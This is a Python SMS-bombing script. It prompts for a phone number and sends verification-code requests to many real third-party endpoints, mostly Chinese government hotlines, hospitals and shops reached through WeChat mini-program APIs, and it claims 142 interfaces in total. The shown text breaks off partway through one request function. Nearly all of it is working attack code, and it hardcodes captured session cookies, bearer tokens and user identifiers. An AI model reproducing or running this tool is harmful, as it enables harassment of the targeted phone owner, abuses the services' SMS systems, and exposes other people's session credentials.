import requests
import json
from concurrent.futures import ThreadPoolExecutor
print("共142个接口")
print("SethAion制作")
print("--------------------------------")
phone = input("请输入手机号：")

def request_url1():
    url1 = "https://miniapps.nj12345.net/wechatsmallprogram/rest/checkcode/getCheckCode"
    headers1 = {
        "Host": "miniapps.nj12345.net",
        "Connection": "keep-alive",
        "Content-Length": "72",
        "xweb_xhr": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://servicewechat.com/wxed80cacf752b522a/42/page-frame.html",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9"
    }
    data1 = {"token": "Epoint_WebSerivce_**##0601", "params": {"mobile": phone}}

    response1 = requests.post(url1, headers=headers1, json=data1)
    print("第1个接口运行完毕")

def request_url119():

    url119 = "https://passport.xag.cn/home/sms_code"
    headers119 = {
    "Host": "passport.xag.cn",
    "Connection": "keep-alive",
    "Content-Length": "24",
    "mini": "member",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "Authorization": "Basic QTFDQ0FFOUItNjcwMi0wOUY4LTVDNjUtOTM3M0ZEQkY4OTY4OjNhYzcxNjk2OGM0NzlmMmMzZTVhYjc1MjQ2OTYyMWJi",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "application/json",
    "xweb_xhr": "1",
    "X-Requested-With": "XMLHttpRequest",
    "token": "",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx43471742f3e783cb/213/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data119 = {
    "icc": "86",
    "phone": phone
}

    response119 = requests.post(url119, 
headers=headers119, data=data119)

def request_url2():
    url2 = "https://www.luzhou12345.cn/app12345wbs.asmx/getInfo"
    headers2 = {
        "Host": "www.luzhou12345.cn",
        "Connection": "keep-alive",
        "Content-Length": "80",
        "xweb_xhr": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://servicewechat.com/wx218d959b2ebd15a7/13/page-frame.html",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9"
    }
    data2 = {"AcceptType": "sendwritevercode", "AcceptContent": f'{{"Mobile":"{phone}"}}'}

    response2 = requests.post(url2, headers=headers2, json=data2)
    print("第2个接口运行完毕")

def request_url3():
    url3 = "https://12345xcx.shaanxi.gov.cn/xcxrest/rest/applets/onlineUser/getUnloginMsgCode"
    headers3 = {
        "Host": "12345xcx.shaanxi.gov.cn",
        "Connection": "keep-alive",
        "Content-Length": "100",
        "Accept": "text/html;charset=utf-8",
        "xweb_xhr": "1",
        "x-authenticated-userid": "",
        "Authorization": "Bearer undefined",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
        "Content-Type": "application/json;charset=UTF-8",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://servicewechat.com/wxd8aa257f596cdad9/44/page-frame.html",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9"
    }
    data3 = {"token": "Epoint_WebSerivce_**##0601", "params": {"userMobile": phone, "validateCodeType": "01"}}

    response3 = requests.post(url3, headers=headers3, json=data3)
    print("第3个接口运行完毕")
    
def request_url4():
    url4 = "https://www.tbeatcny.cn:10015/zhwl/api/sjzj/verificationCode"
    headers4 = {
    "Host": "www.tbeatcny.cn:10015",
    "Connection": "keep-alive",
    "Content-Length": "26",
    "xweb_xhr": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx17286984933e6e9e/125/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data4 = {"username": phone}

    response4 = requests.post(url4, headers=headers4, json=data4)
    print("第4个接口运行完毕")

def request_url5():
    url5 = "https://wxpay-web.yixincapital.com/wxpay-web/minBasis/verificationCode"
    headers5 = {
    "Host": "wxpay-web.yixincapital.com",
    "Connection": "keep-alive",
    "Content-Length": "71",
    "xweb_xhr": "1",
    "cookie": "",
    "yixin": "63f0a60118a1e90f4844c666465ba5b0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wxc5bea8c2c3586398/70/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data5 = {
    "openId": "IzaKfsCaIjNAhbSJ8mTaJSWPbQJDKW1IidEbQoPPIYE%3D",
    "phone": phone
}

    response5 = requests.post(url5, headers=headers5, data=data5)
    print("第5个接口运行完毕")

def request_url6():
    url6 = "https://qyzwfw.cn/cns-bmfw-webrest/rest/mobileUser/getCheckCode"
    headers6 = {
    "Host": "qyzwfw.cn",
    "Connection": "keep-alive",
    "Content-Length": "72",
    "xweb_xhr": "1",
    "Authorization": "Bearer fa29301a889060f25b6ccad9d2f493b3",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "Content-Type": "application/json;charest=UTF-8",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wxf983f4eb853c26bc/8/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data6 = {
    "token": "Epoint_WebSerivce_**##0601",
    "params": {
        "mobile": phone
    }
}

    response6 = requests.post(url6, headers=headers6, json=data6)
    print("第6个接口运行完毕")

def request_url7():
    url7 = "https://www.12345hbsz.com/szbmfwwxrest/rest/userInfo/getVerifiCode"
    headers7 = {
    "Host": "www.12345hbsz.com",
    "Connection": "keep-alive",
    "Content-Length": "77",
    "Accept": "text/html;charset=utf-8",
    "xweb_xhr": "1",
    "Authorization": "Bearer",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "Content-Type": "application/json;charest=UTF-8",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx08f3dbf24a512230/11/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data7 = {
    "token": "Epoint_WebSerivce_**##0601",
    "params": {
        "phoneNumber": phone
    }
}
    response7 = requests.post(url7, headers=headers7, json=data7)
    print("第7个接口运行完毕")

def request_url8():
    url8 = "https://www.xysxzspj.com/index/Server/send_code.html"
    headers8 = {
        "Host": "www.xysxzspj.com",
        "Connection": "keep-alive",
        "Content-Length": "17",
        "xweb_xhr": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "*/*",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://servicewechat.com/wx401fdaf166382a62/4/page-frame.html",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9"
    }
    data8 = {"phone": phone}
    response8 = requests.post(url8, headers=headers8, data=data8)
    print("第8个接口运行完毕")
    
def request_url9():
    
    url9 = "https://b.aifabu.com/v1/setSmsCode"
    headers9 = {
    "Host": "b.aifabu.com",
    "Connection": "keep-alive",
    "Content-Length": "30",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://www.aifabu.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3947.100 Safari/537.36",
    "Content-Type": "application/json",
    "Referer": "https://www.aifabu.com/register",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data9 = {"phone": phone, "type": 1}

    response9 = requests.post(url9, headers=headers9, json=data9)
    print("第9个接口运行完毕")    

def request_url10():
    url10 = "https://userapi.heaye.shop/api/auth/sendSms"
    headers10 = {
    "Host": "userapi.heaye.shop",
    "Connection": "keep-alive",
    "Content-Length": "23",
    "xweb_xhr": "1",
    "Authorization": "Bearer oHQMv5f-j93ZBVLZVN5P5f8Ehrms",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "Content-Type": "application/json;charset=UTF-8",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx38bb9a6b3ddc1d77/177/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data10 = {"phone": phone}

    response10 = requests.post(url10, headers=headers10, json=data10)
    print("第10个接口运行完毕")
    
def request_url11():
    url11 = "https://www.mytijian.com/main/action/mobileValidationCode?_site=hnszsy&_siteType=mobile&_p=&clientVersion=v1.1.6"
    headers11 = {
    "Host": "www.mytijian.com",
    "Connection": "keep-alive",
    "Content-Length": "26",
    "unique-submit-token": "2a87e5f9-c78a-4c50-9830-e715d9dbf134_1710752032041",
    "x-mytjian-client": "WECHAT_MINI_APP",
    "xweb_xhr": "1",
    "Cookie": "SESSION=686cdb0d-abb1-461f-8349-a9d441c78948;",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx650990c67b116478/31/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data11 = {"scene": "6", "mobile": phone}

    response11 = requests.post(url11, headers=headers11, data=data11)
    print("第11个接口运行完毕")
    
def request_url12():
    url12 = "https://health.gz12hospital.cn:6603/smartpe-busi-service/app/captcha"
    headers12 = {
    "Host": "health.gz12hospital.cn:6603",
    "Connection": "keep-alive",
    "Content-Length": "47",
    "xweb_xhr": "1",
    "Cookie": "JSESSIONID=",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "token": "",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx7ec9015f854756ec/14/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data12 = {"archiveCode": "440130", "mobile": phone}

    response12 = requests.post(url12, headers=headers12, json=data12)
    print("第12个接口运行完毕")
    
def request_url13():
    url13 = "https://a.welife001.com/applet/sendVerifyCode"
    headers13 = {
    "Host": "a.welife001.com",
    "Connection": "keep-alive",
    "Content-Length": "23",
    "x-rid": "3ACFBC8F-F10E-454F-80F7-E9CF80EFA70B",
    "imprint": "oWRkU0UWqnOnuclLWq1fDw0SHnqs",
    "xweb_xhr": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "Content-Type": "application/json;charset=UTF-8",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx23d8d7ea22039466/2307/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data13 = {"phone": phone}

    response13 = requests.post(url13, headers=headers13, json=data13)
    print("第13个接口运行完毕")    
    
def request_url14():
    url14 = "https://mc.tengmed.com/formaltrpcapi/patient_manager/sendPhoneVerifyCode"
    headers14 = {
    "Host": "mc.tengmed.com",
    "Connection": "keep-alive",
    "Content-Length": "112",
    "Th-Session-Id": "nszli17107510056466xqDMumPGcno4AcG2RgBl4N5IbUa27137d0-wx",
    "xweb_xhr": "1",
    "Th-Auth-Type": "tencent-health-mini",
    "Th-Appid": "wxc35283883e1d86d5",
    "Th-Code": "",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wxc35283883e1d86d5/240/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data14 = {"request": {"commonIn": {"requestId": "5cbc9535-fbe7-4f39-8902-37bf8ef68889", "channel": ""}, "phone": phone}}

    response14 = requests.post(url14, headers=headers14, json=data14)
    print("第14个接口运行完毕")

def request_url15():
    url15 = "https://ls.xzrcfw.com/App/Sys/SendPhoneCode"
    headers15 = {
    "Host": "ls.xzrcfw.com",
    "Connection": "keep-alive",
    "Content-Length": "131",
    "xweb_xhr": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx244d94feafd1e7f7/8/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data15 = {"requestModel": {"phone": phone, "OptionType": 1, "Role": 2}, "Token": None, "Source": "MiniProject", "Platform": 2, "isTibetan": False}

    response15 = requests.post(url15, headers=headers15, json=data15)
    print("第15个接口运行完毕")

def request_url16():
    url16 = "https://qjpt.dypmw.com/api/xilujob.sms/send"
    headers16 = {
    "Host": "qjpt.dypmw.com",
    "Connection": "keep-alive",
    "Content-Length": "24",
    "xweb_xhr": "1",
    "cityid": "0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx3a1972bbf0d8aaee/17/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data16 = {"mobile": phone}
    
    response16 = requests.post(url16, headers=headers16, json=data16)
    print("第16个接口运行完毕")

def request_url17():
    url17 = "https://www.hnzgfwpt.cn/ums-wechat/sms/send-code"
    headers17 = {
    "Host": "www.hnzgfwpt.cn",
    "Connection": "keep-alive",
    "Content-Length": "147",
    "xweb_xhr": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx66e8d31ce1746b26/15/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}
    data17 = {"unionid": "oLhND6juFSLTyPDtojyUxFrpZQuQ", "mobile": phone, "msgPrefix": "【河南新就业工会】"}

    response17 = requests.post(url17, headers=headers17, data=data17)
    print("第17个接口运行完毕")

def request_url18():
    url18 = "https://applets.qinyunjiuye.cn/sxzhjy_h5/tel/telmessage/save"
    headers18 = {
    "Host": "applets.qinyunjiuye.cn",
    "Connection": "keep-alive",
    "Content-Length": "21",
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://applets.qinyunjiuye.cn",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://applets.qinyunjiuye.cn/sxzhjy_h5/common/register",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Cookie": "sxzhjy_h5_JSESSIONID=5a1224a5-8522-4728-98a5-63e77895b46e; x_host_key=18e50dcb1bb-08f9fcecc48af8278514a5c43164c331fa74d2ce"
}
    data18 = {"telephone": phone}

    response18 = requests.post(url18, headers=headers18, data=data18)
    print("第18个接口运行完毕")

def request_url19():
    url19 = "https://edu.jsgpa.com/admin/apis/user/api/user/send/code"

    headers19 = {
    "Host": "edu.jsgpa.com",
    "Connection": "keep-alive",
    "Content-Length": "32",
    "xweb_xhr": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wxf54a2e4b15af66b6/8/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}

    data19 = {"phone": phone, "type": 1}

    response19 = requests.post(url19, headers=headers19, json=data19)
    print("第19个接口运行完毕")

def request_url20():
    url20 = "https://eibp-api.ynjspx.cn/before/captcha/smsCode"

    headers20 = {
    "Host": "eibp-api.ynjspx.cn",
    "Connection": "keep-alive",
    "Content-Length": "23",
    "xweb_xhr": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wxb489afebd817b08c/37/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}

    data20 = {"phone": phone}

    response20 = requests.post(url20, headers=headers20, json=data20)
    print("第20个接口运行完毕")

def request_url21():
    url21 = "https://yuanzhijiekeji.cn/api.html"

    headers21 = {
    "Host": "yuanzhijiekeji.cn",
    "Connection": "keep-alive",
    "Content-Length": "57",
    "xweb_xhr": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/8555",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx5f54ab339a33e547/5/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}

    data21 = {"mobile": phone, "code": "reg", "method": "user.sms"}

    response21 = requests.post(url21, headers=headers21, json=data21)
    print("第21个接口运行完毕")

def request_url22():
    url22 = "https://826625173.ehpp.club/weapp/customer/getCheckNo"
    headers22 = {
    "Host": "826625173.ehpp.club",
    "Connection": "keep-alive",
    "Content-Length": "23",
    "xweb_xhr": "1",
    "Cookie": "koa:sess=eyJza2V5IjoiZTE3Nzc0NTVmNTFhZjQ3ZmFkOThmMTYwOTE2ODVjZTY1OTc4Yzg0MiIsInVzZXJpbmZvIjp7InVpZCI6MzU2OSwib3BlbklkIjoib1dBNmE1WGJGYlVjS3VjS29xOU04R1UweXV1NCIsIm5pY2tOYW1lIjoi5b6u5L+h55So5oi3IiwiYXZhdGFyVXJsIjoiaHR0cHM6Ly90aGlyZHd4LnFsb2dvLmNuL21tb3Blbi92aV8zMi9QT2dFd2g0bUlITzRuaWJIMEtsTUVDTmpqR3hRVXEyNFpFYUdUNHBvQzZpY1JpY2NWR0tTeVh3aWJjUHE0QldtaWFJR3VHMWljd3hhUVg2Z3JDOVZlbVpvSjhyZy8xMzIiLCJyZWFsTmFtZSI6bnVsbCwiZ2VuZGVyIjowLCJwcm92aW5jZSI6IiIsImNvdW50cnkiOiIiLCJjaXR5IjoiIiwiY29tcGFueU5hbWUiOm51bGwsImNvbXBhbnlpZCI6bnVsbCwiYm9udXMiOjAsInRvdGFsX2JvbnVzIjowLCJsYXN0X3VwbG9hZF9ydW5fdGltZSI6bnVsbCwiY3JlYXRlX3RpbWUiOiIyMDI0LTAzLTIyVDA1OjE2OjA3LjAwMFoiLCJhaWQiOm51bGwsInBob25lIjoiIiwibWVtYmVyIjowLCJtZW1iZXJfdXBkYXRlIjoiMjAyNC0wMy0yMlQwNToxNjowNy4wMDBaIiwibWVtYmVyX2xldmVsIjpudWxsfSwiX2V4cGlyZSI6MTcxMTY4OTM2NzI3MiwiX21heEFnZSI6NjA0ODAwMDAwfQ==; path=/; expires=Fri, 29 Mar 2024 05:16:07 GMT; httponly",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx10456ccd8ac36129/29/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}

    data22 = {"phone": phone}

    response22 = requests.post(url22, headers=headers22, json=data22)
    print("第22个接口运行完毕")

def request_url23():
    url23 = "https://media.hzj7.com/index.php/App800/Login/phone_code"
    headers23 = {
    "Host": "media.hzj7.com",
    "Connection": "keep-alive",
    "Content-Length": "17",
    "xweb_xhr": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "Content-Type": "application/x-www-form-urlencoded",
    "Accept": "*/*",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx26b5da4a7499bd28/10/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}

    data23 = {"phone": phone}

    response23 = requests.post(url23, headers=headers23, data=data23)
    print("第23个接口运行完毕")

def request_url26():
    url26 = "https://shop.zdjt.com/api.html"
    headers26 = {
    "Host": "shop.zdjt.com",
    "Connection": "keep-alive",
    "Content-Length": "58",
    "Accept": "application/json",
    "xweb_xhr": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
    "Content-Type": "application/json",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://servicewechat.com/wx90330e7d263388a9/57/page-frame.html",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "zh-CN,zh;q=0.9"
}

    data26 = {"mobile": phone, "code": "bind", "method": "user.sms"}

    response26 = requests.post(url26, headers=headers26, json=data26)
    print("第24个接口运行完毕")

def request_url27():
    data27 = {"mobile": phone, "event": "login"}
    headers27 = {
    "Host": "smart.shuye.com",
    "Connection": "keep-alive",
    "Content-Length": "40",
    "xweb_xhr": "1",
    "Accept-Language": "zh-cn",
